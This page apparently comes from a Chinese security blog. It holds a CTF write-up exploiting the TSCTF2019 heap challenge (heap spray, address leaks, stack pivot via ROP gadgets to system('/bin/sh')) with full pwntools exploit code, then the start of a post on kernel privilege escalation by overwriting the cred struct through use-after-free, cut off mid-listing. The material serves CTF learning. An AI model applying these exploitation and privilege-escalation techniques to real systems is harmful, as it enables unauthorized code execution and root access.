</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/18/TSCTF2019%20%E8%96%9B%E5%AE%9A%E8%B0%94%E7%9A%84%E5%A0%86%E5%9D%97-HeapSpray/">TSCTF2019 薛定谔的堆块-HeapSpray</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-23</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>heapspray有很多的应用场景，但大多都是windows下的漏洞应用，关于Glibc的比较少，至今只看见两题：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://atum.li/2016/12/05/calc/" >pwnhub.cn 故事的开始 calc</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/206484" >TSCTF2019 薛定谔的堆块</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这里参考第二篇文章针对第二题做个复现，理解下堆喷的思想。</p>

        <h2 id="1-函数理解"   >
          <a href="#1-函数理解" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-函数理解" class="headerlink" title="1.函数理解"></a>1.函数理解</h2>
      <p>这里分析起来比较麻烦，最好就调试，直接给出相关的功能：</p>

        <h3 id="1-Create函数："   >
          <a href="#1-Create函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Create函数：" class="headerlink" title="(1)Create函数："></a>(1)Create函数：</h3>
      <ul>
<li><p>创建chunk，但每次Create会创建0x10个相同大小的chunk，且大小为输入size+4。比如输入size为0xc，那么创建的chunk就是0x10个0x18大小的Chunk。同时每0x10个小chunk在宏观意义上组成一个大chunk，这里用SmallChunk和BigChunk区分一下。</p>
</li>
<li><p>chunk的索引在全局数组dword_4060，chunkList中随机排列，比如idx为0的chunk不一定是第一个创建的。</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-46-26.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-49-21.png" alt="img"></p>
<p>这点在后面堆喷会用到，无法简单地通过打印值来判断heap地址，只能判断出在哪个BigChunk中，还得判断出某个SmallChunk在BigChunk中的位置才能泄露出堆地址。</p>
<ul>
<li><p>创建chunk读取数据时read_str函数里有\x00截断，所以Display在没有UAF的情况下难以泄露出地址，这里也不存在堆溢出。</p>
</li>
<li><p>选择chunk类型时会给chunk_addr+size处赋值，这里就是之前申请size+4的原因。</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-56-19.png" alt="img"></p>
<p>这个赋予的值是一个ELF上的data数据地址，没啥用，迷惑用的，同时如果选择的选项不为1-4的话，就会不赋值，这个在后面很有用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-58-56.png" alt="img"></p>

        <h3 id="2-Display函数："   >
          <a href="#2-Display函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Display函数：" class="headerlink" title="(2)Display函数："></a>(2)Display函数：</h3>
      <p>比较常规，输出给定index范围的SmallChunk的内容</p>

        <h3 id="3-Delete函数："   >
          <a href="#3-Delete函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Delete函数：" class="headerlink" title="(3)Delete函数："></a>(3)Delete函数：</h3>
      <p>删除最后一次Create的BigChunk的所有SmallChunk，free数据且置指针NULL，没啥漏洞。但是这里删除是依据chunkList的顺序索引删除，而chunkList又是被打乱的，所以删除之后的顺序其实不是我们最开始输入数据的顺序，这个在后面unsortedbin泄露数据的时候需要注意一下。</p>

        <h3 id="4-Modify函数："   >
          <a href="#4-Modify函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Modify函数：" class="headerlink" title="(4)Modify函数："></a>(4)Modify函数：</h3>
      <p>编辑指定index的Small Block的内容，这里没啥用</p>

        <h3 id="5-CallFunction函数："   >
          <a href="#5-CallFunction函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-CallFunction函数：" class="headerlink" title="(5)CallFunction函数："></a>(5)CallFunction函数：</h3>
      <p>根据Create时的最后那4byte的数值来决定执不执行某个函数指针(这个函数指针就是最开始创建的时候赋值的ELF上的数据)。</p>
<ul>
<li><p>*(chunk_addr+size) != 0，则set <em>(</em>(chunk_addr+size)) -= 1</p>
</li>
<li><p>*(chunk_addr+size) == 0，则jmp <em>(</em>(chunk_addr+size))+0x4</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-06-41.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-07-14.png" alt="img"></p>
<p>这里调用CallFunction函数之后就可以调用到0xf7e87401，这里的*0x57d1ab8c是我们在堆上设置好的内容。</p>

        <h2 id="2-漏洞发现："   >
          <a href="#2-漏洞发现：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞发现：" class="headerlink" title="2.漏洞发现："></a>2.漏洞发现：</h2>
      <p>这里就结合Create函数，利用先申请填充内容之后再释放，使得<code>*(chunk_addr+size)</code>可控，从而能够调用任意函数。但是在保护全开的情况下想要调用函数，必须需要泄露地址，而地址在没有漏洞的情况下又没办法泄露。</p>
<p>堆喷原理：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Fang3s/articles/3911561.html" >https://www.cnblogs.com/Fang3s/articles/3911561.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-堆喷结合CallFunction函数的-1泄露地址："   >
          <a href="#1-堆喷结合CallFunction函数的-1泄露地址：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆喷结合CallFunction函数的-1泄露地址：" class="headerlink" title="(1)堆喷结合CallFunction函数的-1泄露地址："></a>(1)堆喷结合CallFunction函数的-1泄露地址：</h3>
      <p>假设某个堆地址：magic_addr。由于这里可以Display，所以如果<code>*magic_addr= magic_addr-1</code>，而利用堆喷使得一定范围内的堆内容都为magic_addr，打印内容之后，就可以依据打印的内容，能够从中筛选出magic_addr，获取其索引，再经过我们制造堆喷过程中运算就能得到开始堆喷的地址start_addr。</p>
<p>比如：magic_addr = 0x58585858，申请了0x100个0x20000大小的Chunk，那么得到索引为0x58，且magic_addr 也是一个0x20000的chunk，就可求得start_addr为0x58585858-0x58*0x20000。当然这是理论上的，实际还得一系列的判断运算。</p>
<p>同理，在当我们释放堆块进入unsortedbin之后，踩下main_arena地址再申请回来，由于\x00截断很难泄露出地址，这里也是采用这个方法，使得\x00-1成为0xff来把\x00截断给抹杀。</p>

        <h3 id="2-getshell原理"   >
          <a href="#2-getshell原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell原理" class="headerlink" title="(2)getshell原理"></a>(2)getshell原理</h3>
      <p>有了地址之后就可调用libc上任意的函数了，这里的one_gadget都用不了，在没办法往栈上输入数据的情况下就需要栈劫持了，这里找两个gadget，原题给的是：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">magic_gadget1 = <span class="number">0x00161871</span><span class="comment"># 0x00161871 : xchg eax, ecx ; cld ; call dword ptr[eax]</span></span><br><span class="line">magic_gadget2 = <span class="number">0x00072e1a</span><span class="comment"># 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;</span></span><br></pre></td></tr></table></div></figure>

<p>我用我自己编译的Libc是：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">magic_gadget1 = <span class="number">0x00164401</span><span class="comment"># 0x00161871 : xchg eax, ecx ; cli ; jmp dword ptr[eax]</span></span><br><span class="line">magic_gadget2 = <span class="number">0x00073c10</span>+<span class="number">0x3a</span><span class="comment"># 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;</span></span><br></pre></td></tr></table></div></figure>

<p>一样的，没啥区别，得自己找去。ROPgadget。</p>
<p>在调用<code>jmp *(*(chunk_addr+size))+0x4</code>时，看到context为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-38-18.png" alt="img"></p>
<p>这里的ecx就保存这一个堆地址，那么我们就利用ecx和eax结合这两个gdaget来进行栈劫持，从而getshell。</p>

        <h2 id="3-exp编写："   >
          <a href="#3-exp编写：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-exp编写：" class="headerlink" title="3.exp编写："></a>3.exp编写：</h2>
      
        <h3 id="1-堆喷堆布局"   >
          <a href="#1-堆喷堆布局" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆喷堆布局" class="headerlink" title="(1)堆喷堆布局"></a>(1)堆喷堆布局</h3>
      <p>填充数据在堆上，满足<code>*magic_addr=magic_addr</code>，且其他chunk的所有数据也为magic_addr</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------</span></span><br><span class="line"><span class="comment">#fill 0x58 to all chunk</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    data.append([<span class="string">&#x27;X&#x27;</span> * (<span class="number">0x20000</span> - <span class="number">1</span>), <span class="number">1</span>])</span><br><span class="line">malloc(<span class="number">0x20000</span>, data)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    malloc(<span class="number">0x20000</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#idx 0x0-&gt;0x100-1</span></span><br><span class="line"><span class="comment">#----------------------------------------</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-填充需要触发的chunk数据"   >
          <a href="#2-填充需要触发的chunk数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-填充需要触发的chunk数据" class="headerlink" title="(2)填充需要触发的chunk数据"></a>(2)填充需要触发的chunk数据</h3>
      <p>满足<code>*chunk_addr + size = magic_addr</code>，然后调用callfuc函数使得<code>*magic_addr= magic_addr-1</code>，打印数据之后即可判断。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-----------------------------------------------</span></span><br><span class="line"><span class="comment">#fill 0x1000 all 0x58 (idx 0x100-&gt;0x110-1)</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    data.append([<span class="string">&#x27;X&#x27;</span> * (<span class="number">0x1000</span> - <span class="number">1</span>), <span class="number">1</span>])</span><br><span class="line">malloc(<span class="number">0x1000</span>, data)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    data.append([<span class="string">&#x27;X&#x27;</span> * (<span class="number">0xf0</span> - <span class="number">1</span>), <span class="number">0</span>])</span><br><span class="line">malloc(<span class="number">0xf0</span>, data)</span><br><span class="line"><span class="comment">#idx 0x100-&gt;0x110-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x100-&gt;0x110-1 OK</span></span><br><span class="line">callfuc(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#-----------------------------------------------</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="3-判断chunk基于的BigChunk索引："   >
          <a href="#3-判断chunk基于的BigChunk索引：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-判断chunk基于的BigChunk索引：" class="headerlink" title="(3)判断chunk基于的BigChunk索引："></a>(3)判断chunk基于的BigChunk索引：</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">offest = <span class="number">0</span></span><br><span class="line">out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">magic_addr = <span class="number">0x58585858</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    out = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;W&#x27;</span> <span class="keyword">in</span> out:</span><br><span class="line">        index = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">out = out[<span class="number">12</span> : ]</span><br><span class="line">offest = out.index(<span class="string">&#x27;W&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;magic_addr is : %d&#x27;</span> % index)</span><br><span class="line">log.info(<span class="string">&#x27;offest is : %d&#x27;</span> % offest)</span><br><span class="line">log.info(<span class="string">&#x27;start addr is : &#x27;</span> + <span class="built_in">hex</span>(magic_addr- offest))</span><br><span class="line">block_start = (index / <span class="number">0x10</span>) * <span class="number">0x10</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="4-计算chunk在BigChunk中的位置："   >
          <a href="#4-计算chunk在BigChunk中的位置：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-计算chunk在BigChunk中的位置：" class="headerlink" title="(4)计算chunk在BigChunk中的位置："></a>(4)计算chunk在BigChunk中的位置：</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line">p_index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    log.info(<span class="string">&quot;start find prev block count = %d&quot;</span> % count)</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        data.append([p32(magic_addr - <span class="number">0x20008</span> * count) * (<span class="number">0x1000</span> / <span class="number">4</span> - <span class="number">1</span>),</span><br><span class="line"><span class="number">1</span>])</span><br><span class="line">    malloc(<span class="number">0x1000</span>, data)</span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        data.append([<span class="string">&#x27;X&#x27;</span> * (<span class="number">0xa0</span> - <span class="number">1</span>), <span class="number">0</span>])</span><br><span class="line">    malloc(<span class="number">0xa0</span>, data)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;start call fuc count = %d&quot;</span> % count)</span><br><span class="line">    callfuc(<span class="number">0x100</span>)</span><br><span class="line">    show(block_start - <span class="number">0x10</span>, index + <span class="number">1</span>)</span><br><span class="line">    p_index = <span class="number">0</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index + <span class="number">1</span> - block_start + <span class="number">0x10</span>):</span><br><span class="line">        out = p.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;W&#x27;</span> <span class="keyword">in</span> out:</span><br><span class="line">            p_index = i + block_start - <span class="number">0x10</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    delete()</span><br><span class="line">    <span class="keyword">if</span> p_index &lt; block_start:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;block start is : %d&#x27;</span> % block_start)</span><br><span class="line">log.info(<span class="string">&#x27;p_index is : %d&#x27;</span> % p_index)</span><br><span class="line">heap_start_addr = magic_addr - <span class="number">0x20008</span> * (count - <span class="number">1</span> + <span class="number">0x10</span> * (block_start / <span class="number">0x10</span>)) - offest - <span class="number">8</span></span><br><span class="line">log.info(<span class="string">&#x27;heap start is : &#x27;</span> + <span class="built_in">hex</span>(heap_start_addr))</span><br></pre></td></tr></table></div></figure>

<p>同样的方法，依据地址顺序遍历BigChunk中的0x1-0x10的所有可能范围，对于修改*chunk_addr= magic_addr-1，然后打印判断得到各个索引对应的地址。由于创建的时候是random函数，所以也可以用爆破的方式解决，概率为1/16。</p>

        <h3 id="5-获取libc地址"   >
          <a href="#5-获取libc地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-获取libc地址" class="headerlink" title="(5)获取libc地址"></a>(5)获取libc地址</h3>
      <p>方法是释放之后使之进入unsortedbin踩下地址，利用callfuc函数和字节错位的方法对抗\x00截断从而泄露出地址：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    data.append([p32(heap_start_addr + <span class="number">8</span> + <span class="number">3</span> ) * (<span class="number">0x1000</span> / <span class="number">4</span> - <span class="number">1</span>), <span class="number">1</span>])</span><br><span class="line">malloc(<span class="number">0x1000</span>, data)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    data.append([<span class="string">&#x27;aaa&#x27;</span>, <span class="number">0</span>])</span><br><span class="line">malloc(<span class="number">0xa0</span>, data)</span><br><span class="line">callfuc(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index + <span class="number">1</span> - block_start + <span class="number">0x10</span>):</span><br><span class="line">    out = p.recvline()</span><br><span class="line">    out = out[<span class="number">12</span> : -<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aaa&#x27;</span> != out:</span><br><span class="line">        libc_addr = u32(out[<span class="number">4</span> : <span class="number">8</span>]) + <span class="number">1</span> - <span class="number">0x1b07b0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">log.info(<span class="string">&#x27;libc addr is : &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">delete()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-1.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-1.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png" alt="img"></p>
<p>这里的main_arena变化是因为0xedb7ab000变为了0xedb7afff，导致字节错位变化的，具体调试一下就知道</p>

        <h3 id="6-劫持栈"   >
          <a href="#6-劫持栈" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-劫持栈" class="headerlink" title="(6)劫持栈"></a>(6)劫持栈</h3>
      <p>结合gadget来getshell。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">magic_gadget1 = <span class="number">0x00164401</span>       </span><br><span class="line"><span class="comment">#xchg eax, ecx ; cli ; jmp dword ptr[eax] </span></span><br><span class="line">magic_gadget2 = <span class="number">0x00073c10</span>+<span class="number">0x3a</span>  </span><br><span class="line"><span class="comment">#xchg eax, esp ; sal bh, 0xd8 ;</span></span><br><span class="line">system_offest = <span class="number">0x3adb0</span></span><br><span class="line">binsh_addr = <span class="number">0x15bb0b</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    data.append([p32(heap_start_addr + <span class="number">12</span>) * (<span class="number">0x1000</span> / <span class="number">4</span> - <span class="number">1</span>), <span class="number">1</span>])</span><br><span class="line">malloc(<span class="number">0x1000</span>, data)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    data.append([(p32(libc_addr + magic_gadget2) + p32(<span class="number">0</span>) + p32(libc_addr</span><br><span class="line">+ magic_gadget1) + p32(<span class="number">0</span>) * <span class="number">4</span> + p32(libc_addr + system_offest) + p32(<span class="number">0</span>) +</span><br><span class="line">p32(libc_addr + binsh_addr)).ljust(<span class="number">0xa0</span> -<span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>), <span class="number">0</span>])</span><br><span class="line">malloc(<span class="number">0xa0</span>, data)</span><br><span class="line">callfuc(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>这里关于最后堆上数据的布局需要调试才能知道，建议先随便写几个，然后调试的时候在写数据。</p>
<p>▲题外话：这里其实并没有用到常规意义上的通过堆喷滑板0x0c，0x58之类的滑板指令来执行shellcode或者ROP，所以其实这里的magic_addr换成0x57575757，0x56565656也是一样可以的，只不过成功率可能会小不少，毕竟这里还最开始申请了一个随机大小的堆块，而且PIE堆的随机化程度也大多在0x56到0x58之间。</p>

        <h2 id="4-总结："   >
          <a href="#4-总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-总结：" class="headerlink" title="4.总结："></a>4.总结：</h2>
      <ul>
<li><p>堆喷思想：其实就是多级指针的思想，通过劫持指针来滑动程序流或者泄露地址。</p>
</li>
<li><p>调试：汇编指令一定要熟悉，像劫持栈常用的xchg eax,esp等。</p>
</li>
</ul>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/18/pwn-kernel_%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%89%8B%E6%AE%B5/">pwn-kernel_常见提权手段</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、利用cred结构体提权：</p>
<p>1.前置知识：</p>
<p>(1)kernel中会为每个进程创建一个cred结构体，保存了该进程的权限等信息如（uid，gid）等，如果能修改这个结构体那么就修改了这个进程的权限。</p>
<p>(2)修改进程的权限为root之后，再通过该进程开的shell那么也就是root权限了，实现提权。</p>
<p>2.利用手段：</p>
<p>(1)通过UAF，将一块已经释放的堆块修改大小为cred结构体大小，然后创建进程，就会将该堆块申请为cred结构体。</p>
<p>(2)再通过UAF将该cred结构体中的uid、gid改掉，实现进程提权。</p>
<p>▲那么如何知道cred结构体的大小呢，不同linux内核版本的cred结构体大小不同：</p>
<p>①通过linux内核版本，上源码查看网址，查找对应的cred结构体：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458125.jpeg" alt="img"></p>
<p>访问对应版本：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.70/source/include/linux/cred.h" >https://elixir.bootlin.com/linux/v4.4.70/source/include/linux/cred.h</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>可以看到某内核的cred结构体大小，这里是0xa8：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t usage; 0x4</span><br><span class="line">    #ifdef CONFIG_DEBUG_CREDENTIALS debug选项去掉</span><br><span class="line">    atomic_t subscribers; /* number of processes subscribed */</span><br><span class="line">    void *put_addr;</span><br><span class="line">    unsigned magic;</span><br><span class="line">    #define CRED_MAGIC 0x43736564</span><br><span class="line">    #define CRED_MAGIC_DEAD 0x44656144</span><br><span class="line">    #endif</span><br><span class="line">    kuid_t uid; /* real UID of the task */ 0x4</span><br><span class="line">    kgid_t gid; /* real GID of the task */ 0x4</span><br><span class="line">    kuid_t suid; /* saved UID of the task */ 0x4</span><br><span class="line">    kgid_t 